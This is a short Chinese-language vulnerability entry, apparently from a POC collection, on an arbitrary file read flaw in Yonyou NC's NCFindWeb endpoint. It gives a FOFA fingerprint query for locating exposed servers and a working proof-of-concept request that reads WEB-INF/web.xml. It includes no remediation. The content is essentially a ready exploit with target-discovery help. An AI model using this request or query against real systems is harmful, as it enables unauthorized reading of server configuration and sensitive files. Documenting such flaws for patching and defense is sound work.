# 用友 NC NCFindWeb 任意文件读取漏洞

## 漏洞描述

用友NC存在任意文件读取漏洞，攻击者通过漏洞可读取服务器敏感文件

## 漏洞影响

```
用友NC
```

## FOFA

```
icon_hash="1085941792"
```

## 漏洞复现

登陆页面

![img](./images/1628351304159-f00b4a4f-a104-40f4-a8bf-1ea00cf72c98.png)

验证POC **/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml**

![img](./images/1628351371286-e2898425-5e54-438a-b5eb-4f20eed3636b.png)

